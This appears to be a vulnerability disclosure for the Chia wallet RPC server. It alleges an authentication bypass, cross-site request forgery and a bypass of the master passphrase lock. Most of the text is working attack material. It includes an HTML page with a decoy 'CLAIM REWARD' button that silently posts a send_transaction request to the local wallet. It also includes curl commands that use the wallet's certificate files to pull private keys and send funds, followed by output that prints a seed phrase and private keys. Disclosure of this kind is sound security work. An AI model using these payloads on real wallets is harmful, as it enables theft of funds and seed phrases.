# Chia Network RPC - Authentication Bypass, CSRF, and Master Passphrase Lock Bypass

## Summary
The Chia RPC server (`rpc_server_base.py`) contains **multiple critical vulnerabilities** that allow remote attackers to drain funds and extract private keys.

### 1. Authentication Bypass (CWE-306)
If no RPC credentials are set in the config (default), `_authenticate()` returns `True` for **all requests**:

```python
if self._get_rpc_username() is None:
    return True  # <-- NO AUTHENTICATION
2. CSRF / Cross-Origin Request Forgery
No CORS headers

No origin validation

Any malicious website can send POST requests to localhost:9256 (Wallet) or localhost:8555 (Full Node)

Browser blocks reading the response, but the wallet executes the command

3. Master Passphrase Bypass (Critical)
The Wallet GUI enforces a Master Passphrase

The RPC server ignores the locked state

Any local process with access to mTLS certificates can call:

/send_transaction → Steal funds

/get_private_key → Exfiltrate 24-word seed in plain text

No passphrase prompt. No authentication.

POC:

Remote CSRF (Browser → Local Wallet)
<!DOCTYPE html>
<html>
<head>
    <title>Chia CSRF PoC</title>
</head>
<body>
    <h1>Chia RPC Authentication Bypass</h1>
    <button onclick="exploit()">CLAIM REWARD (CSRF PoC)</button>
    <script>
        function exploit() {
            fetch('http://127.0.0.1:9256/send_transaction', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    "method": "send_transaction",
                    "params": {
                        "wallet_id": 1,
                        "address": "txch1testnet11_any_address",
                        "amount": 100,
                        "fee": 0
                    }
                })
            });
        }
    </script>
</body>
</html>
Result: Transaction signed and broadcast. Browser shows CORS error → Irrelevant.

Local Privilege Escalation (Master Passphrase Bypass + Seed Extraction)
Command used to extract the 24-word seed WITHOUT passphrase:
curl --insecure \
  --cert ~/.chia/mainnet/config/ssl/wallet/private_wallet.crt \
  --key ~/.chia/mainnet/config/ssl/wallet/private_wallet.key \
  -d '{"fingerprint": 3889508350}' \
  -H "Content-Type: application/json" \
  -X POST https://localhost:9256/get_private_key
Server response (success):
{
  "private_key": {
    "farmer_pk": "0xba7320eb2864f73a56995b9334662793e8efd31b327503d79c57a38b85dd4e",
    "fingerprint": 3889508350,
    "pk": "0xb647367f40a7e892fcdf7d77d3c1c2793ed8c2d8a36ee63cef7817777a8a98806c15c18c6fa57ad5ec4da3a93f482548",
    "pool_pk": "0xb4735f7b7cfaf7568f0871e9ab3187b7cd78b838994a18c0b952706f2294e826d2a0a47d1774372852a7680bbf4f",
    "seed": "crystal switch legal close fine body picnic whale reward oval skirt elite turtleneck glided armed nasty pencil begin jelly resemble warrior usage like goddess",
    "sk": "0x383841e46c69c65bd02e79a985c61e89923351a96d0ceb80570943a1cd0582"
  },
  "success": true
}
Was the Master Passphrase requested?  NO.
Was the wallet in "locked" state?  IRRELEVANT — RPC ignores it.
Is this 'by design'?  NO. This is a critical vulnerability.
Send Transaction Without Passphrase
curl -X POST https://localhost:9256/send_transaction \
  --cert ~/.chia/mainnet/config/ssl/wallet/private_wallet.crt \
  --key ~/.chia/mainnet/config/ssl/wallet/private_wallet.key \
  -H "Content-Type: application/json" \
  -d '{
    "wallet_id": 1,
    "address": "txch167666q6re68f000g27sc66f000g27sc66f00g27sc66f000sp67z87",
    "amount": 1000,
    "fee": 0
  }'
Result: {"success": true, "transaction_id": "0xb7345a6dd5d01715f31dd11aba98e3b54286fa6a384a0f25090aff9a1ae24f3e"}

Passphrase required? NO.



